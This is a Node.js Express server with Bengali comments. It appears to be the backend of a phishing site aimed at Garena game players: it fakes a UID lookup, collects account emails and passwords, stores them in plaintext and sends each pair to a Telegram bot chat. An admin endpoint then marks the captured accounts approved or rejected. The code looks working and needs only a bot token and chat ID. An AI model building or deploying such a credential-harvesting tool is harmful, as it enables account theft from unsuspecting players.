const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// টেলিগ্রাম বটের টোকেন এবং চ্যাট আইডি (আপনার এগুলো বসিয়ে নিবেন)
const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';

// ডাটাবেজ (মেমোরি)
const dailyData = {};      // { uid: { name, level, date } }
const userAccountStatus = {}; // { uid: { email, password, status: 'pending'|'approved'|'rejected' } }

// আজকে কত তারিখ (YYYY-MM-DD)
function getTodayDate() {
    return new Date().toISOString().split('T')[0];
}

// ১. টেলিগ্রাম থেকে প্রতিদিনের UID ডেটা আপডেট করার API (Webhook/Manual Endpoint)
app.post('/api/telegram-update-daily', (req, res) => {
    const { uid, name, level, secret_key } = req.body;
    
    // সিম্পল সিকিউরিটি চেক
    if (secret_key !== "MY_ADMIN_SECRET") {
        return res.status(403).json({ success: false, message: "Unauthorized" });
    }

    if (!uid) return res.status(400).json({ success: false, message: "UID required" });

    dailyData[uid] = {
        name: name || null,
        level: level || null,
        date: getTodayDate()
    };

    return res.json({ success: true, message: `Updated daily data for UID: ${uid}` });
});

// ২. ওয়েবসাইটের সার্চ API
app.get('/api/search/:uid', (req, res) => {
    const { uid } = req.params;
    const today = getTodayDate();

    // ডিফল্ট রেসপন্স
    let response = {
        uid: uid,
        name: "Garena Player",
        level: "60",
        hasDailyInfo: false,
        accountStatus: null // null / pending / approved / rejected
    };

    // চেক করা আজকের কোনো ডেলি ডেটা আছে কি না
    if (dailyData[uid] && dailyData[uid].date === today) {
        response.name = dailyData[uid].name || response.name;
        response.level = dailyData[uid].level || response.level;
        response.hasDailyInfo = true;
    }

    // অ্যাকাউন্ট স্ট্যাটাস চেক
    if (userAccountStatus[uid]) {
        response.accountStatus = userAccountStatus[uid].status;
    }

    res.json(response);
});

// ৩. ইমেইল/পাসওয়ার্ড সাবমিশন API
app.post('/api/submit-account', async (req, res) => {
    const { uid, email, password } = req.body;

    if (!uid || !email || !password) {
        return res.status(400).json({ success: false, message: "All fields required" });
    }

    const currentRecord = userAccountStatus[uid];

    // যদি আগে রিজেক্ট বা অন্য স্ট্যাটাসে থাকে কিন্তু এখন ইমেইল বা পাসওয়ার্ড চেঞ্জ করে সাবমিট দেওয়া হয়
    if (!currentRecord || currentRecord.email !== email || currentRecord.password !== password) {
        // রিসেট করে নতুন পেন্ডিং রিকোয়েস্ট তৈরি
        userAccountStatus[uid] = {
            email,
            password,
            status: 'pending'
        };

        // টেলিগ্রামে মেসেজ পাঠানো
        const text = `🔔 *New Account Submission*\n\n🆔 *UID:* \`${uid}\`\n📧 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\`\n\n*Action Required:* Verify this account.`;
        
        try {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
        } catch (e) {
            console.error("Telegram send error:", e);
        }

        return res.json({ success: true, message: "Request sent for verification", status: "pending" });
    } else {
        // যদি সেম ইমেইল-পাসওয়ার্ড দিয়েই আবার সাবমিট দেয়
        return res.json({ success: true, message: "Status retrieved", status: currentRecord.status });
    }
});

// ৪. টেলিগ্রাম বা এডমিন থেকে রিকোয়েস্ট Reject/Approve করার API
app.post('/api/admin-set-status', (req, res) => {
    const { uid, status, secret_key } = req.body; // status = 'approved' or 'rejected'

    if (secret_key !== "MY_ADMIN_SECRET") {
        return res.status(403).json({ success: false, message: "Unauthorized" });
    }

    if (userAccountStatus[uid]) {
        userAccountStatus[uid].status = status;
        return res.json({ success: true, message: `Status for UID ${uid} set to ${status}` });
    } else {
        return res.status(404).json({ success: false, message: "UID record not found" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
